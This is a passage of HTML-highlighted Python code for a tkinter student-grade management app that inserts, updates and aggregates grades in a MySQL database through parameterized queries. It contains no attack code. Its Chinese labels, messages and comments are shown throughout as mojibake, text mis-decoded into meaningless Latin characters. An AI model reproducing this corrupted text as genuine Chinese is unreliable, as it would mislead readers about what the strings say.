class="string">f&quot;æ›´æ–°å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delete_course</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;åˆ é™¤è¯¾ç¨‹ä¿¡æ¯ï¼ˆæ— é€‰è¯¾è®°å½•çš„è¯¾ç¨‹ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                sql = <span class="string">&quot;DELETE FROM course WHERE NOT EXISTS (SELECT * FROM sc WHERE sc.cno=course.cno)&quot;</span></span><br><span class="line">                cursor.execute(sql)</span><br><span class="line">            messagebox.showinfo(<span class="string">&quot;æˆåŠŸ&quot;</span>, <span class="string">&quot;å·²åˆ é™¤æ— é€‰è¯¾è®°å½•çš„è¯¾ç¨‹ä¿¡æ¯ï¼&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span class="string">f&quot;åˆ é™¤å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubWindow3</span>(tk.Toplevel):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, master, connection</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(master)</span><br><span class="line">        <span class="variable language_">self</span>.title(<span class="string">&quot;ç»´æŠ¤å­¦ç”Ÿæˆç»©&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.geometry(<span class="string">&quot;450x635+900+50&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.connection = connection</span><br><span class="line"></span><br><span class="line">        <span class="comment"># èƒŒæ™¯å›¾è®¾ç½®</span></span><br><span class="line">        bg_image = PhotoImage(file=<span class="string">&quot;bg_image.png&quot;</span>)</span><br><span class="line">        background_label = Label(<span class="variable language_">self</span>, image=bg_image)</span><br><span class="line">        background_label.place(relwidth=<span class="number">1</span>, relheight=<span class="number">1</span>)</span><br><span class="line">        background_label.image = bg_image  <span class="comment"># ä¿æŒå¼•ç”¨ä»¥é˜²å›¾ç‰‡è¢«å›æ”¶</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¾“å…¥å­—æ®µå’Œæ ‡ç­¾æ¡†æ¶</span></span><br><span class="line">        input_frame = Frame(<span class="variable language_">self</span>, bg=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">        input_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.4</span>, anchor=<span class="string">&quot;center&quot;</span>)  <span class="comment"># å±…ä¸­æ”¾ç½®</span></span><br><span class="line"></span><br><span class="line">        fields = [<span class="string">&quot;å­¦å·:&quot;</span>, <span class="string">&quot;è¯¾ç¨‹å·:&quot;</span>, <span class="string">&quot;æˆç»©:&quot;</span>]</span><br><span class="line">        <span class="variable language_">self</span>.entries = []</span><br><span class="line">        <span class="keyword">for</span> i, field <span class="keyword">in</span> <span class="built_in">enumerate</span>(fields):</span><br><span class="line">            label = tk.Label(input_frame, text=field, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bg=<span class="string">&#x27;white&#x27;</span>, fg=<span class="string">&#x27;Black&#x27;</span>)</span><br><span class="line">            label.grid(row=i, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">15</span>, sticky=<span class="string">&quot;e&quot;</span>)  <span class="comment"># æ ‡ç­¾åœ¨æ¡†æ¶å†…å³å¯¹é½</span></span><br><span class="line">            entry = tk.Entry(input_frame, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bd=<span class="number">3</span>, bg=<span class="string">&#x27;lightyellow&#x27;</span>, fg=<span class="string">&#x27;Black&#x27;</span>, width=<span class="number">25</span>)</span><br><span class="line">            entry.grid(row=i, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">15</span>, sticky=<span class="string">&quot;w&quot;</span>)  <span class="comment"># è¾“å…¥æ¡†åœ¨æ¡†æ¶å†…å·¦å¯¹é½</span></span><br><span class="line">            <span class="variable language_">self</span>.entries.append(entry)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æŒ‰é’®å¸ƒå±€</span></span><br><span class="line">        button_frame = Frame(<span class="variable language_">self</span>, bg=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">        button_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.85</span>, anchor=<span class="string">&quot;center&quot;</span>)</span><br><span class="line"></span><br><span class="line">        insert_button = tk.Button(</span><br><span class="line">            button_frame, text=<span class="string">&quot;ç¡®è®¤æ·»åŠ &quot;</span>, command=<span class="variable language_">self</span>.insert_sc_table, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;14&#x27;</span>),</span><br><span class="line">            bg=<span class="string">&#x27;lightblue&#x27;</span>, fg=<span class="string">&#x27;White&#x27;</span>, bd=<span class="number">6</span>, activeforeground=<span class="string">&quot;SpringGreen&quot;</span>, activebackground=<span class="string">&quot;Wheat&quot;</span></span><br><span class="line">        )</span><br><span class="line">        insert_button.grid(row=<span class="number">0</span>, column=<span class="number">0</span>, padx=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">        update_button = tk.Button(</span><br><span class="line">            button_frame, text=<span class="string">&quot;ç¡®è®¤ä¿®æ”¹&quot;</span>, command=<span class="variable language_">self</span>.update_sc_table, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;14&#x27;</span>),</span><br><span class="line">            bg=<span class="string">&#x27;lightblue&#x27;</span>, fg=<span class="string">&#x27;White&#x27;</span>, bd=<span class="number">6</span>, activeforeground=<span class="string">&quot;SpringGreen&quot;</span>, activebackground=<span class="string">&quot;Wheat&quot;</span></span><br><span class="line">        )</span><br><span class="line">        update_button.grid(row=<span class="number">0</span>, column=<span class="number">1</span>, padx=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">        tk.Button(button_frame, text=<span class="string">&quot;ç¡®è®¤æ·»åŠ &quot;</span>, command=<span class="variable language_">self</span>.insert_sc_table, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;14&#x27;</span>)).grid(row=<span class="number">0</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>)</span><br><span class="line">        tk.Button(button_frame, text=<span class="string">&quot;ç¡®è®¤ä¿®æ”¹&quot;</span>, command=<span class="variable language_">self</span>.update_sc_table, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;14&#x27;</span>)).grid(row=<span class="number">0</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insert_sc_table</span>(<span class="params">self</span>):</span><br><span class="line">        new_sno = <span class="variable language_">self</span>.entries[<span class="number">0</span>].get()</span><br><span class="line">        new_cno = <span class="variable language_">self</span>.entries[<span class="number">1</span>].get()</span><br><span class="line">        new_grade = <span class="variable language_">self</span>.entries[<span class="number">2</span>].get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                sql = <span class="string">&quot;INSERT INTO sc(sno, cno, grade) VALUES (%s, %s, %s);&quot;</span></span><br><span class="line">                cursor.execute(sql, (new_sno, new_cno, new_grade))</span><br><span class="line">            messagebox.showinfo(<span class="string">&quot;æˆåŠŸ&quot;</span>, <span class="string">f&quot;å·²æ·»åŠ æˆç»©ä¿¡æ¯ï¼&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span class="string">f&quot;æ·»åŠ å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update_sc_table</span>(<span class="params">self</span>):</span><br><span class="line">        new_sno = <span class="variable language_">self</span>.entries[<span class="number">0</span>].get()</span><br><span class="line">        new_cno = <span class="variable language_">self</span>.entries[<span class="number">1</span>].get()</span><br><span class="line">        new_grade = <span class="variable language_">self</span>.entries[<span class="number">2</span>].get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                sql = <span class="string">&quot;UPDATE sc SET grade=%s WHERE sno=%s AND cno=%s;&quot;</span></span><br><span class="line">                cursor.execute(sql, (new_grade, new_sno, new_cno))</span><br><span class="line">                <span class="variable language_">self</span>.connection.commit()  <span class="comment"># æäº¤äº‹åŠ¡</span></span><br><span class="line">                messagebox.showinfo(<span class="string">&quot;æˆåŠŸ&quot;</span>, <span class="string">f&quot;å·²æ›´æ–°æˆç»©ä¿¡æ¯ï¼&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span class="string">f&quot;æ›´æ–°å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span class="string">f&quot;å‘ç”ŸæœªçŸ¥é”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubWindow4</span>(tk.Toplevel):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, master, connection</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(master)</span><br><span class="line">        <span class="variable language_">self</span>.title(<span class="string">&quot;ç»Ÿè®¡å­¦ç”Ÿæˆç»©&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.geometry(<span class="string">&quot;450x635+900+50&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.connection = connection</span><br><span class="line"></span><br><span class="line">        <span class="comment"># èƒŒæ™¯å›¾è®¾ç½®</span></span><br><span class="line">        bg_image = PhotoImage(file=<span class="string">&quot;bg_image.png&quot;</span>)</span><br><span class="line">        background_label = Label(<span class="variable language_">self</span>, image=bg_image)</span><br><span class="line">        background_label.place(relwidth=<span class="number">1</span>, relheight=<span class="number">1</span>)</span><br><span class="line">        background_label.image = bg_image  <span class="comment"># ä¿æŒå¼•ç”¨ä»¥é˜²å›¾ç‰‡è¢«å›æ”¶</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¾“å…¥å­—æ®µå’Œæ ‡ç­¾æ¡†æ¶</span></span><br><span class="line">        input_frame = Frame(<span class="variable language_">self</span>, bg=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">        input_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.4</span>, anchor=<span class="string">&quot;center&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å­—æ®µåå’Œè¾“å…¥æ¡†</span></span><br><span class="line">        fields = [<span class="string">&quot;ç³»:&quot;</span>, <span class="string">&quot;è¯¾ç¨‹å·:&quot;</span>]</span><br><span class="line">        <span class="variable language_">self</span>.entries = []</span><br><span class="line">        <span class="keyword">for</span> i, field <span class="keyword">in</span> <span class="built_in">enumerate</span>(fields):</span><br><span class="line">            label = tk.Label(input_frame, text=field, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bg=<span class="string">&#x27;white&#x27;</span>, fg=<span class="string">&#x27;Black&#x27;</span>)</span><br><span class="line">            label.grid(row=i, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">15</span>, sticky=<span class="string">&quot;e&quot;</span>)</span><br><span class="line">            entry = tk.Entry(input_frame, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bd=<span class="number">3</span>, bg=<span class="string">&#x27;lightyellow&#x27;</span>, fg=<span class="string">&#x27;Black&#x27;</span>, width=<span class="number">25</span>)</span><br><span class="line">            entry.grid(row=i, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">15</span>, sticky=<span class="string">&quot;w&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.entries.append(entry)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ“ä½œæŒ‰é’®æ¡†æ¶</span></span><br><span class="line">        button_frame = Frame(<span class="variable language_">self</span>, bg=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">        button_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.85</span>, anchor=<span class="string">&quot;center&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å››ä¸ªæŸ¥è¯¢æŒ‰é’®å¹¶æ’æ’åˆ—</span></span><br><span class="line">        buttons = [</span><br><span class="line">            (<span class="string">&quot;æŸ¥è¯¢å¹³å‡æˆç»©&quot;</span>, <span class="variable language_">self</span>.query_average_score),</span><br><span class="line">            (<span class="string">&quot;æŸ¥è¯¢æœ€é«˜æˆç»©&quot;</span>, <span class="variable language_">self</span>.query_highest_score),</span><br><span class="line">            (<span class="string">&quot;æŸ¥è¯¢æœ€ä½æˆç»©&quot;</span>, <span class="variable language_">self</span>.query_lowest_score),</span><br><span class="line">            (<span class="string">&quot;æŸ¥è¯¢ä¸åŠæ ¼äººæ•°&quot;</span>, <span class="variable language_">self</span>.query_fail_count),</span><br><span class="line">            (<span class="string">&quot;æŸ¥è¯¢ä¼˜ç§€ç‡&quot;</span>, <span class="variable language_">self</span>.query_excellent_rate)  <span class="comment"># æ–°å¢ä¼˜ç§€ç‡æŒ‰é’®</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i, (text, command) <span class="keyword">in</span> <span class="built_in">enumerate</span>(buttons):</span><br><span class="line">            button = tk.Button(</span><br><span class="line">                button_frame, text=text, command=command, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;12&#x27;</span>),</span><br><span class="line">                bg=<span class="string">&#x27;lightblue&#x27;</span>, fg=<span class="string">&#x27;White&#x27;</span>, bd=<span class="number">6</span>, activeforeground=<span class="string">&quot;SpringGreen&quot;</span>, activebackground=<span class="string">&quot;Wheat&quot;</span></span><br><span class="line">            )</span><br><span class="line">            button.grid(row=i // <span class="number">2</span>, column=i % <span class="number">2</span>, padx=<span class="number">10</span>, pady=<span class="number">10</span>)  <span class="comment"># ä¸¤è¡Œä¸¤åˆ—æ’åˆ—</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æŸ¥è¯¢ç»“æœæ˜¾ç¤º</span></span><br><span class="line">        <span class="variable language_">self</span>.result_text = tk.Text(<span class="variable language_">self</span>, height=<span class="number">6</span>, width=<span class="number">37</span>, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bg=<span class="string">&quot;lightyellow&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.result_text.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.6</span>, anchor=<span class="string">&quot;center&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">query_average_score</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æŸ¥è¯¢å¹³å‡æˆç»©&quot;&quot;&quot;</span></span><br><span class="line">        sdept = <span class="variable language_">self</span>.entries[<span class="number">0</span>].get()</span><br><span class="line">        cno = <span class="variable language_">self</span>.entries[<span class="number">1</span>].get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                sql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                SELECT ROUND(AVG(grade), 2) FROM sc </span></span><br><span class="line"><span class="string">                JOIN student ON sc.sno = student.sno </span></span><br><span class="line"><span class="string">                WHERE student.sdept = %s AND sc.cno = %s;</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span></span><br><span class="line">                cursor.execute(sql, (sdept, cno))</span><br><span class="line">                result = cursor.fetchone()</span><br><span class="line">                <span class="variable language_">self</span>.result_text.insert(tk.END, <span class="string">f&quot;å¹³å‡æˆç»©: <span class="subst">&#123;result[<span class="number">0</span>] <span class="keyword">if</span> result[<span class="number">0</span>] <span class="keyword">else</span> <span class="string">&#x27;æ— æ•°æ®&#x27;</span>&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span class="string">f&quot;æŸ¥è¯¢å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">query_highest_score</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æŸ¥è¯¢æœ€é«˜æˆç»©&quot;&quot;&quot;</span></span><br><span class="line">        sdept = <span class="variable language_">self</span>.entries[<span class="number">0</span>].get()</span><br><span class="line">        cno = <span class="variable language_">self</span>.entries[<span class="number">1</span>].get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                sql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                SELECT MAX(grade) FROM sc </span></span><br><span class="line"><span class="string">                JOIN student ON sc.sno = student.sno </span></span><br><span class="line"><span class="string">                WHERE student.sdept = %s AND sc.cno = %s;</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span></span><br><span class="line">                cursor.execute(sql, (sdept, cno))</span><br><span class="line">                result = cursor.fetchone()</span><br><span class="line">                <span class="variable language_">self</span>.result_text.insert(tk.END, <span class="string">f&quot;æœ€é«˜æˆç»©: <span class="subst">&#123;result[<span class="number">0</span>] <span class="keyword">if</span> result[<span class="number">0</span>] <span class="keyword">else</span> <span class="string">&#x27;æ— æ•°æ®&#x27;</span>&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span class="string">f&quot;æŸ¥è¯¢å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">query_lowest_score</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æŸ¥è¯¢æœ€ä½æˆç»©&quot;&quot;&quot;</span></span><br><span class="line">        sdept = <span class="variable language_">self</span>.entries[<span class="number">0</span>].get()</span><br><span class="line">        cno = <span class="variable language_">self</span>.entries[<span class="number">1</span>].get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                sql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                SELECT MIN(grade) FROM sc </span></span><br><span class="line"><span class="string">                JOIN student ON sc.sno = student.sno </span></span><br><span class="line"><span class="string">                WHERE student.sdept = %s AND sc.cno = %s;</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span></span><br><span class="line">                cursor.execute(sql, (sdept, cno))</span><br><span class="line">                result = cursor.fetchone()</span><br><span class="line">                <span class="variable language_">self</span>.result_text.insert(tk.END, <span class="string">f&quot;æœ€ä½æˆç»©: <span class="subst">&#123;result[<span class="number">0</span>] <span class="keyword">if</span> result[<span class="number">0</span>] <span class="keyword">else</span> <span class="string">&#x27;æ— æ•°æ®&#x27;</span>&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span class="string">f&quot;æŸ¥è¯¢å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">query_fail_count</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æŸ¥è¯¢ä¸åŠæ ¼äººæ•°&quot;&quot;&quot;</span></span><br><span class="line">        sdept = <span class="variable language_">self</span>.entries[<span class="number">0</span>].get()</span><br><span class="line">        cno = <span class="variable language_">self</span>.entries[<span class="number">1</span>].get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                sql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                SELECT COUNT(*) FROM sc </span></span><br><span class="line"><span class="string">                JOIN student ON sc.sno = student.sno </span></span><br><span class="line"><span class="string">                WHERE student.sdept = %s AND sc.cno = %s AND grade &lt; 60;</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span></span><br><span class="line">                cursor.execute(sql, (sdept, cno))</span><br><span class="line">                result = cursor.fetchone()</span><br><span class="line">                <span class="variable language_">self</span>.result_text.insert(tk.END, <span class="string">f&quot;ä¸åŠæ ¼äººæ•°: <span class="subst">&#123;result[<span class="number">0</span>] <span class="keyword">if</span> result[<span class="number">0</span>] <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span>&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span class="string">f&quot;æŸ¥è¯¢å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">query_excellent_rate</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æŸ¥è¯¢ä¼˜ç§€ç‡ (æˆç»© &gt; 80)&quot;&quot;&quot;</span></span><br><span class="line">        sdept = <span class="variable language_">self</span>.entries[<span class="number">0</span>].get()</span><br><span class="line">        cno = <span class="variable language_">self</span>.entries[<span class="number">1</span>].get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                <span class="comment"># è®¡ç®—ä¼˜ç§€äººæ•°å’Œæ€»äººæ•°</span></span><br><span class="line">                sql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                SELECT </span></span><br><span class="line"><span class="string">                    COUNT(*) AS excellent_count,</span></span><br><span class="line"><span class="string">                    (SELECT COUNT(*) FROM sc WHERE cno = %s AND student.sdept = %s) AS total_count</span></span><br><span class="line"><span class="string">                FROM sc </span></span><br><span class="line"><span class="string">                JOIN student ON sc.sno = student.sno </span></span><br><span class="line"><span class="string">                WHERE student.sdept = %s AND sc.cno = %s AND grade &gt; 80;</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span></span><br><span class="line">                cursor.execute(sql, (cno, sdept, sdept, cno))</span><br><span class="line">                result = cursor.fetchone()</span><br><span class="line">                excellent_count = result[<span class="number">0</span>] <span class="keyword">if</span> result[<span class="number">0</span>] <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">                total_count = result[<span class="number">1</span>] <span class="keyword">if</span> result[<span class="number">1</span>] <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">                excellent_rate = (excellent_count / total_count * <span class="number">100</span>) <span class="keyword">if</span> total_count &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">                <span class="variable language_">self</span>.result_text.insert(tk.END, <span class="string">f&quot;ä¼˜ç§€ç‡: <span class="subst">&#123;excellent_rate:<span class="number">.2</span>f&#125;</span>%\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span class="string">f&quot;æŸ¥è¯¢å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubWindow5</span>(tk.Toplevel):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, master, connection</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(master)</span><br><span class="line">        <span class="variable language_">self</span>.title(<span class="string">&quot;å­¦ç”Ÿæˆç»©æ’å&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.geometry(<span class="string">&quot;450x635+900+50&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.connection = connection</span><br><span class="line"></span><br><span class="line">        <span class="comment"># èƒŒæ™¯å›¾è®¾ç½®</span></span><br><span class="line">        bg_image = PhotoImage(file=<span class="string">&quot;bg_image.png&quot;</span>)</span><br><span class="line">        background_label = Label(<span class="variable language_">self</span>, image=bg_image)</span><br><span class="line">        background_label.place(relwidth=<span class="number">1</span>, relheight=<span class="number">1</span>)</span><br><span class="line">        background_label.image = bg_image  <span class="comment"># é˜²æ­¢å›¾ç‰‡è¢«å›æ”¶</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¾“å…¥å­—æ®µå’Œæ ‡ç­¾æ¡†æ¶</span></span><br><span class="line">        input_frame = Frame(<span class="variable language_">self</span>, bg=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">        input_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.4</span>, anchor=<span class="string">&quot;center&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å­—æ®µåå’Œè¾“å…¥æ¡†</span></span><br><span class="line">        fields = [<span class="string">&quot;ç³»:&quot;</span>, <span class="string">&quot;è¯¾ç¨‹å·:&quot;</span>]</span><br><span class="line">        <span class="variable language_">self</span>.entries = []</span><br><span class="line">        <span class="keyword">for</span> i, field <span class="keyword">in</span> <span class="built_in">enumerate</span>(fields):</span><br><span class="line">            label = tk.Label(input_frame, text=field, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bg=<span class="string">&#x27;white&#x27;</span>, fg=<span class="string">&#x27;Black&#x27;</span>)</span><br><span class="line">            label.grid(row=i, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">15</span>, sticky=<span class="string">&quot;e&quot;</span>)</span><br><span class="line">            entry = tk.Entry(input_frame, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bd=<span class="number">3</span>, bg=<span class="string">&#x27;lightyellow&#x27;</span>, fg=<span class="string">&#x27;Black&#x27;</span>, width=<span class="number">25</span>)</span><br><span class="line">            entry.grid(row=i, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">15</span>, sticky=<span class="string">&quot;w&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.entries.append(entry)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æŒ‰é’®æ¡†æ¶</span></span><br><span class="line">        button_frame = Frame(<span class="variable language_">self</span>, bg=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">        button_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.85</span>, anchor=<span class="string">&quot;center&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æŸ¥è¯¢æŒ‰é’®</span></span><br><span class="line">        rank_button = tk.Button(</span><br><span class="line">            button_frame, text=<span class="string">&quot;æŸ¥è¯¢æˆç»©æ’å&quot;</span>, command=<span class="variable language_">self</span>.query_rankings, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;14&#x27;</span>),</span><br><span class="line">            bg=<span class="string">&#x27;lightblue&#x27;</span>, fg=<span class="string">&#x27;White&#x27;</span>, bd=<span class="number">6</span>, activeforeground=<span class="string">&quot;SpringGreen&quot;</span>, activebackground=<span class="string">&quot;Wheat&quot;</span></span><br><span class="line">        )</span><br><span class="line">        rank_button.grid(row=<span class="number">0</span>, column=<span class="number">0</span>, padx=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æŸ¥è¯¢ç»“æœæ˜¾ç¤º</span></span><br><span class="line">        <span class="variable language_">self</span>.result_text = tk.Text(<span class="variable language_">self</span>, height=<span class="number">6</span>, width=<span class="number">37</span>, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bg=<span class="string">&quot;lightyellow&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.result_text.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.6</span>, anchor=<span class="string">&quot;center&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">query_rankings</span>(<span class="params">self</span>):</span><br><span class="line">        <span 